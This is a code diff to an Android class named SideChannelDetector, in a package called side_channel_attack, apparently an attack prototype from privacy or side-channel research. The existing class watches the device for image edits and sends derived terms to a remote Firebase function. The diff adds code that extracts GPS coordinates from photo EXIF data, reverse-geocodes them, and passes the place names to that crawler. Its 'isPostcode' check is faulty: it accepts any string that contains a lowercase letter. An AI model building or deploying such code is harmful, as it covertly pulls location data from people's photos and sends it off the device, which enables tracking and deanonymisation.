@@ -3,12 +3,16 @@ package com.example.side_channel_attack;
 import android.content.Context;
 import android.graphics.Bitmap;
 import android.hardware.camera2.CameraManager;
+import android.location.Address;
+import android.location.Geocoder;
+import android.media.ExifInterface;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.FileObserver;
 import android.provider.MediaStore;
 import android.support.annotation.NonNull;
+import android.util.Pair;
 
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.OnSuccessListener;
@@ -31,6 +35,8 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.HashMap;
+import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 
 public class SideChannelDetector {
@@ -117,7 +123,7 @@ public class SideChannelDetector {
                         PASSIVE_STATE = 1;
                         ACTIVE_STATE = 0;
                         long activeStateEndTime = System.currentTimeMillis();
-                        if ((activeStateEndTime - activeStateStartTime) >= 8000) {
+                        if ((activeStateEndTime - activeStateStartTime) >= 6000) {
                             imagePostModified = new File(dir.getPath() + "/" + file);
                             timestamp = getCurrentUTCTimestamp();
                             sendData();
@@ -202,15 +208,56 @@ public class SideChannelDetector {
 //
                                                                     for (String category : matchStrings) {
                                                                         for (String term : data.get(category)) {
+
+                                                                            if (category.equals("locationMatches")) {
+
+                                                                                int apiContainer = (int) ((Math.floor(((double) counter) / 10)) % 3);
+                                                                                queryCrawler(apiContainer, term, true);
+
+                                                                                if (counter++ == 30) {
+                                                                                    break;
+                                                                                }
+                                                                            }
 //
                                                                             int apiContainer = (int) ((Math.floor(((double) counter) / 10)) % 3);
-                                                                            System.out.println(term);
-                                                                            queryCrawler(apiContainer, term);
+                                                                            queryCrawler(apiContainer, term, false);
                                                                             if (counter++ == 30) {
                                                                                 break;
                                                                             }
                                                                         }
                                                                     }
+
+                                                                    try {
+                                                                        Geocoder geocoder = new Geocoder(context, Locale.getDefault());
+                                                                        ExifInterface exif = new ExifInterface(imagePreModified.getAbsolutePath());
+                                                                        Pair<Float, Float> addresses = geoDegree(exif);
+                                                                        ArrayList<String> store = new ArrayList<>();
+                                                                        if (addresses != null) {
+                                                                            List<Address> geoValues = geocoder.getFromLocation(addresses.first, addresses.second, 10);
+                                                                            for (Address address : geoValues) {
+                                                                                String[] addressItems = new String[]{address.getFeatureName(), address.getLocality(), address.getCountryName()};
+                                                                                for (String item : addressItems) {
+
+                                                                                    if (item != null && isPostcode(item) && !store.contains(item)) {
+                                                                                        int apiContainer = (int) ((Math.floor(((double) counter) / 10)) % 3);
+                                                                                        queryCrawler(apiContainer, item, true);
+                                                                                        store.add(item);
+                                                                                        if (counter++ == 30) {
+                                                                                            break;
+                                                                                        }
+                                                                                    }
+                                                                                }
+
+                                                                            }
+                                                                        }
+
+                                                                    } catch (IOException e) {
+                                                                        e.printStackTrace();
+                                                                    }
+
+                                                                    PASSIVE_STATE = 1;
+                                                                    ACTIVE_STATE = 0;
+
                                                                 }
                                                             });
                                                         }
@@ -253,11 +300,12 @@ public class SideChannelDetector {
     }
 
 
-    private void queryCrawler(int apiContainer, String term) {
+    private void queryCrawler(int apiContainer, String term, boolean isLocation) {
         Map<String, Object> parameters =
                 getParams("tag", term);
 
         parameters.put("apiSlot", apiContainer);
+        parameters.put("isLocation", isLocation);
         HttpsCallableReference searchSingle = mFunctions
                 .getHttpsCallable("searchSingle");
         searchSingle.call(parameters);
@@ -281,5 +329,70 @@ public class SideChannelDetector {
 
         return dateformat.format(c.getTime());
 
+    }
+
+    Pair<Float, Float> geoDegree(ExifInterface exif) {
+        String attrLATITUDE = exif.getAttribute(ExifInterface.TAG_GPS_LATITUDE);
+        String attrLATITUDE_REF = exif.getAttribute(ExifInterface.TAG_GPS_LATITUDE_REF);
+        String attrLONGITUDE = exif.getAttribute(ExifInterface.TAG_GPS_LONGITUDE);
+        String attrLONGITUDE_REF = exif.getAttribute(ExifInterface.TAG_GPS_LONGITUDE_REF);
+
+        if ((attrLATITUDE != null)
+                && (attrLATITUDE_REF != null)
+                && (attrLONGITUDE != null)
+                && (attrLONGITUDE_REF != null)) {
+
+            float Latitude;
+            float Longitude;
+
+            if (attrLATITUDE_REF.equals("N")) {
+                Latitude = convertToDegree(attrLATITUDE);
+            } else {
+                Latitude = 0 - convertToDegree(attrLATITUDE);
+            }
+
+            if (attrLONGITUDE_REF.equals("E")) {
+                Longitude = convertToDegree(attrLONGITUDE);
+            } else {
+                Longitude = 0 - convertToDegree(attrLONGITUDE);
+            }
+
+            return new Pair<>(Latitude, Longitude);
+        }
+        return null;
+    }
+
+    private float convertToDegree(String stringDMS) {
+        Float result = null;
+        String[] DMS = stringDMS.split(",", 3);
+
+        String[] stringD = DMS[0].split("/", 2);
+        Double D0 = new Double(stringD[0]);
+        Double D1 = new Double(stringD[1]);
+        Double FloatD = D0 / D1;
+
+        String[] stringM = DMS[1].split("/", 2);
+        Double M0 = new Double(stringM[0]);
+        Double M1 = new Double(stringM[1]);
+        Double FloatM = M0 / M1;
+
+        String[] stringS = DMS[2].split("/", 2);
+        Double S0 = new Double(stringS[0]);
+        Double S1 = new Double(stringS[1]);
+        Double FloatS = S0 / S1;
+
+        result = new Float(FloatD + (FloatM / 60) + (FloatS / 3600));
+
+        return result;
+    }
+
+
+    boolean isPostcode(String input) {
+        for (char i : input.toCharArray()) {
+            if (i >= 97 && 122 >= i) {
+                return true;
+            }
+        }
+        return false;
     }
 }
